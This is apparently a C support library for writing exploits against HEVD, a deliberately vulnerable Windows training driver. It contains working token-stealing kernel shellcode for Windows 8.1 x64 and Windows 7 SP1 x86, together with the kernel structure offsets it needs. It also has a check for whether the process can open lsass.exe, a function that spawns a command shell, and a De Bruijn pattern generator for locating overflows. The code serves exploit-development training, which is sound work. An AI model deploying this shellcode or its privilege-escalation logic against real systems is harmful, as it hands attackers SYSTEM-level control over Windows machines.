/**
 *
 * Small lib to assist in the exploit process of HEVD
 *
 */

#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdint.h>
#include <tlhelp32.h>
#include <tchar.h>

#pragma comment(lib, "user32.lib")

#define SYSTEM_PROCESS_NAME "lsass.exe"

BOOL DebugMode = FALSE;


/**
 * Few basic logging functions.
 */
void static __xlog(const char* prio, const char* format, va_list args)
{
        size_t fmt_len = strlen(format)+strlen(prio)+2;
        uint8_t *fmt = alloca(fmt_len);
        RtlFillMemory(fmt, fmt_len, '\x00');
        sprintf(fmt, "%s %s", prio, format);
        vfprintf(stderr, fmt, args);
        fflush(stderr);
        return;
}


void info(const char* format, ... )
{
        va_list args;
        va_start(args, format);
        __xlog("[*] ", format, args);
        va_end(args);
}

void ok(const char* format, ... )
{
        va_list args;
        va_start(args, format);
        __xlog("[+] ", format, args);
        va_end(args);
}

void warn(const char* format, ... )
{
        va_list args;
        va_start(args, format);
        __xlog("[!] ", format, args);
        va_end(args);
}

void err(const char* format, ... )
{
        va_list args;
        va_start(args, format);
        __xlog("[-] ", format, args);
        va_end(args);
}

void perr(char* msg)
{
        DWORD eNum;
        char sysMsg[256];
        char* p;

        eNum = GetLastError();
        FormatMessage( FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                       NULL, eNum,
                       MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                       sysMsg, sizeof(sysMsg), NULL);

        p = sysMsg;
        while( ( *p > 31 ) || ( *p == 9 ) )
                ++p;
        do { *p-- = 0; } while( ( p >= sysMsg ) &&
                                ( ( *p == '.' ) || ( *p < 33 ) ) );

        err("%s: %s (%d)\n", msg, sysMsg, eNum);
}


/**
 * Post exploit
 */

DWORD GetProcessIdByName(LPTSTR processName)
{
        HANDLE hProcessSnap, hProcess;
        PROCESSENTRY32 pe32;
        DWORD dwPid;
        BOOL isMatch;

        dwPid = -1;

        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if( hProcessSnap == INVALID_HANDLE_VALUE ){
                perr("CreateToolhelp32Snapshot failed");
                return -1;
        }

        pe32.dwSize = sizeof( PROCESSENTRY32 );

        if( !Process32First( hProcessSnap, &pe32 ) ){
                perr("Process32First failed");
                CloseHandle(hProcessSnap );
                return -1;
        }

        do
        {
                isMatch = FALSE;
                hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID );
                if(!hProcess)
                        continue;

                isMatch = strcmp(processName, pe32.szExeFile)==0;
                CloseHandle(hProcess);

                if (isMatch){
                        dwPid = pe32.th32ProcessID;
                        break;
                }

        } while( Process32Next( hProcessSnap, &pe32 ) );

        CloseHandle( hProcessSnap );
        return dwPid;
}


BOOL CheckIsSystem()
{
        HANDLE hProcess;
        DWORD dwCrssPid;

        dwCrssPid = GetProcessIdByName(SYSTEM_PROCESS_NAME);
        if (dwCrssPid==-1){
                perr("GetProcessIdByName failed");
                return FALSE;
        }

        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwCrssPid);
        if( hProcess == NULL ){
                perr("OpenProcess(\""SYSTEM_PROCESS_NAME"\") failed");
                return FALSE;
        }

        CloseHandle(hProcess);
        return TRUE;
}



BOOL PopupNewProcess(LPSTR lpCommandLine)
{
        STARTUPINFO si;
        PROCESS_INFORMATION pi;

        ZeroMemory( &si, sizeof(si) );
        si.cb = sizeof(si);
        ZeroMemory( &pi, sizeof(pi) );

        info("Spawning '%s'...\n", lpCommandLine);

        if( !CreateProcessA( NULL, lpCommandLine, NULL,
                            NULL, FALSE, CREATE_NEW_CONSOLE,
                            NULL, NULL, &si, &pi) ){
                perr("CreateProcess failed");
                return FALSE;
        }

        ok("'%s' spawned with PID %d\n", lpCommandLine, pi.dwProcessId);
        return TRUE;
}


void PopupCmd()
{
        PopupNewProcess("c:\\windows\\system32\\cmd.exe");
        return;
}


/**
 * Token stealing helper
 */

#if defined(__WIN81__)

#if defined(__X86_64__)
#define KIINITIAL_THREAD  "\x88\x01"  // 0x0188
#define EPROCESS_OFFSET   "\xb8\x00"  // 0x00b8
#define PROCESSID_OFFSET  "\xe0\x02"  // 0x02e0
#define FLINK_OFFSET      "\xe8\x02"  // 0x02e8
#define TOKEN_OFFSET      "\x48\x03"  // 0x0348
#define SYSTEM_PID        "\x04"      // 0x0004
#endif

#elif defined(__WIN7SP1__)

#if defined(__X86_32__)
#define KTHREAD_OFFSET    "\x24\x01"   // 0x0124
#define EPROCESS_OFFSET   "\x50"       // 0x50
#define PID_OFFSET        "\xb4\x00"   // 0x00B4
#define FLINK_OFFSET      "\xb8\x00"   // 0x00B8
#define TOKEN_OFFSET      "\xf8\x00"   // 0x00F8
#define SYSTEM_PID        "\x04"       // 0x04
#endif

// TODO: get more offsets from others Windows versions
#endif


/**
 * Shellcode source: https://gist.github.com/hugsy/763ec9e579796c35411a5929ae2aca27
 */
const char StealTokenShellcode[] = ""
#ifdef __X86_64__
        "\x50"                                                      // push rax
        "\x53"                                                      // push rbx
        "\x51"                                                      // push rcx
        "\x65\x48\x8b\x04\x25" KIINITIAL_THREAD "\x00\x00"          // mov rax, gs:[KIINITIAL_THREAD]
        "\x48\x8b\x80" EPROCESS_OFFSET "\x00\x00"                   // mov rax, [rax+EPROCESS_OFFSET]
        "\x48\x89\xc3"                                              // mov rbx, rax
        "\x48\x8b\x9b" FLINK_OFFSET "\x00\x00"                      // mov rbx, [rbx+FLINK_OFFSET]
        "\x48\x81\xeb" FLINK_OFFSET "\x00\x00"                      // sub rbx, FLINK_OFFSET
        "\x48\x8b\x8b" PROCESSID_OFFSET "\x00\x00"                  // mov rcx, [rbx+PROCESSID_OFFSET]
        "\x48\x83\xf9" SYSTEM_PID                                   // cmp rcx, SYSTEM_PID
        "\x75\xe5"                                                  // jnz -0x19
        "\x48\x8b\x8b" TOKEN_OFFSET "\x00\x00"                      // mov rcx, [rbx + TOKEN_OFFSET]
        "\x80\xe1\xf0"                                              // and cl, 0xf0
        "\x48\x89\x88" TOKEN_OFFSET "\x00\x00"                      // mov [rax + TOKEN_OFFSET], rcx
        "\x59"                                                      // pop rcx
        "\x5b"                                                      // pop rbx
        "\x58"                                                      // pop rax
        "\x48\x83\xc4\x28"                                          // add rsp, 40
        "\x48\x31\xc0"                                              // xor rax, rax
        "\xc3"                                                      // ret
#else
	"\x60"                                                      // pushad
	"\x64\xa1" KTHREAD_OFFSET "\x00\x00"                        // mov eax, fs:[KTHREAD_OFFSET]
	"\x8b\x40" EPROCESS_OFFSET                                  // mov eax, [eax + EPROCESS_OFFSET]
	"\x89\xc1"                                                  // mov ecx, eax
	"\x8b\x98" TOKEN_OFFSET "\x00\x00"                          // mov ebx, [eax + EPROCESS_TOKEN]
	"\xba" SYSTEM_PID "\x00\x00\x00"                            // mov edx, 4
	"\x8b\x80"FLINK_OFFSET"\x00\x00"                            // mov eax, [eax + FLINK_OFFSET]
	"\x2d" FLINK_OFFSET "\x00\x00"                              // sub eax, FLINK_OFFSET
	"\x39\x90" PID_OFFSET "\x00\x00"                            // cmp[eax + PID_OFFSET], edx
	"\x75\xed"                                                  // jne -17
	"\x8b\x90" TOKEN_OFFSET "\x00\x00"                          // mov edx, [eax + TOKEN_OFFSET]
	"\x89\x91" TOKEN_OFFSET "\x00\x00"                          // mov[ecx + TOKEN_OFFSET], edx
	"\x61"                                                      // popad
	"\x31\xc0"                                                  // xor eax, eax
	"\x83\xc4\x0c"                                              // add esp, 12
	"\x5d"                                                      // pop ebp
	"\xc2\x08\x00"                                              // ret 8
#endif
        "";

#define StealTokenShellcodeLength sizeof(StealTokenShellcode)


/**
 * C version of the algorithm implemented in GEF
 */
VOID static PopulateDeBruijnSequence(DWORD t,
                                     DWORD p,
                                     DWORD dwSize,
                                     LPSTR lpAlphabet,
                                     DWORD dwAlphabetLen,
                                     DWORD period,
                                     DWORD* aIndex,
                                     LPSTR lpResult)
{
        if (strlen(lpResult)==dwSize)
                return;

        if (t > period){
                if ((period % p) == 0){
                        for (int j=1; j<p+1; j++) {
                                lpResult[ strlen(lpResult) ] = lpAlphabet[ aIndex[j] ];
                                if (strlen(lpResult)==dwSize)
                                        return;
                        }
                }
        } else{
                aIndex[t] = aIndex[t-p];
                PopulateDeBruijnSequence(t+1, p, dwSize, lpAlphabet, dwAlphabetLen, period, aIndex, lpResult);

                for (int j=aIndex[t-p]+1; j<dwAlphabetLen; j++){
                        aIndex[t] = j;
                        PopulateDeBruijnSequence(t+1, t, dwSize, lpAlphabet, dwAlphabetLen, period, aIndex, lpResult);
                }
        }
        return;
}


LPSTR CreateDeBruijnPatternEx(DWORD dwSize, DWORD dwPeriod)
{
        const LPSTR lpAlphabet = "abcdefghijklmnopqrstuvwxyz";
        DWORD dwAlphabetLen = strlen(lpAlphabet);
        LPSTR lpRes = calloc(sizeof(uint8_t), dwSize+1);
        DWORD* aIndex = calloc(sizeof(uint32_t), dwAlphabetLen * dwPeriod);
        PopulateDeBruijnSequence(1, 1, dwSize, lpAlphabet, dwAlphabetLen, dwPeriod, aIndex, lpRes);
        free(aIndex);
        return lpRes;
}


LPSTR CreateDeBruijnPattern(DWORD dwSize)
{
        return CreateDeBruijnPatternEx(dwSize, sizeof(uintptr_t));
}



/**
 * System info
 */
DWORD GetPageSize()
{
        SYSTEM_INFO siSysInfo;
        GetSystemInfo(&siSysInfo);
        return siSysInfo.dwPageSize;
}
